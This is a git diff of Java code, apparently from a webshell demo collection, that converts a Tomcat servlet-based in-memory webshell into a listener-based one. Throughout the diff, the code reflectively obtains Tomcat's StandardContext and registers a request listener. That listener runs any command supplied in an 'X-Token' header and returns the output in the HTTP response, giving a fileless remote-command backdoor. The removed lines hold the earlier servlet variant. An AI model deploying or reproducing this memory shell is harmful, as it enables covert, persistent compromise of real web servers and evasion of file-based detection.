@@ -1,6 +1,7 @@
 package com.demo.memshell;
 
-import javax.servlet.*;
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
 import javax.servlet.http.HttpServletRequest;
 import java.io.InputStream;
 import java.io.PrintWriter;
@@ -9,15 +10,11 @@ import java.lang.reflect.Method;
 
 /**
  * @author Whoopsunix
- * ContextClassLoader 注入 Tomcat Servlet 型内存马
+ * ContextClassLoader 注入 Tomcat Listener 型内存马
  * Tomcat 8 9
  */
-public class TSMSContextClass implements Servlet {
-
-    final private static String NAME = "Whoopsunix";
-    final private static String pattern = "/WhoopsunixShell";
-
-    public TSMSContextClass() {
+public class TomcatListenerContextClassMS implements ServletRequestListener {
+    public TomcatListenerContextClassMS() {
 
     }
 
@@ -33,74 +30,43 @@ public class TSMSContextClass implements Servlet {
                 Method getContextmethod = resources.getClass().getDeclaredMethod("getContext");
                 getContextmethod.setAccessible(true);
                 standardContext = (org.apache.catalina.core.StandardContext) getContextmethod.invoke(resources);
-            } catch (Exception e) {
+            } catch (Exception ignored) {
                 Object root = getFieldValue(webappClassLoaderBase, "resources");
                 standardContext = (org.apache.catalina.core.StandardContext) getFieldValue(root, "context");
             }
 
-            // wrapper 封装
-            if (standardContext.findChild(NAME) == null) {
-                org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
-                wrapper.setName(NAME);
-                Servlet servlet = new TSMSContextClass();
-                wrapper.setServletClass(servlet.getClass().getName());
-                wrapper.setServlet(servlet);
-                // 添加到 standardContext
-                standardContext.addChild(wrapper);
-
-                try{
-                    // M1 Servlet映射到URL模式
-                    // standardContext.addServletMapping(pattern,NAME);
-                    Method addServletMappingMethod = standardContext.getClass().getDeclaredMethod("addServletMapping", String.class, String.class);
-                    addServletMappingMethod.setAccessible(true);
-                    addServletMappingMethod.invoke(standardContext, pattern, NAME);
-                } catch (NoSuchMethodException e) {
-                    // M2 Servlet3 新特性 Dynamic
-//                        javax.servlet.ServletRegistration.Dynamic registration = new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext);
-//                        registration.addMapping(pattern);
-                    Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext), (Object) new String[]{pattern});
-                }
-            }
-        } catch (Exception e) {
+            TomcatListenerContextClassMS listenerMemShell = new TomcatListenerContextClassMS();
+            standardContext.addApplicationEventListener(listenerMemShell);
+        } catch (Exception ignored) {
+            ignored.printStackTrace();
         }
     }
 
+
     @Override
-    public void init(ServletConfig servletConfig) throws ServletException {
+    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
 
     }
 
     @Override
-    public ServletConfig getServletConfig() {
-        return null;
-    }
-
-    @Override
-    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
+    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
         try {
-            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
+            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequestEvent.getServletRequest();
             String header = httpServletRequest.getHeader("X-Token");
             if (header == null) {
                 return;
             }
             String result = exec(header);
-            PrintWriter printWriter = servletResponse.getWriter();
-            printWriter.println("TSMSContextClass injected");
+            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) getFieldValue(httpServletRequest, "request");
+            PrintWriter printWriter = request.getResponse().getWriter();
+            printWriter.println("TomcatListenerContextClassMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
         }
-    }
-
-    @Override
-    public String getServletInfo() {
-        return null;
-    }
-
-    @Override
-    public void destroy() {
 
     }
+
 
     public static String exec(String str) {
         try {
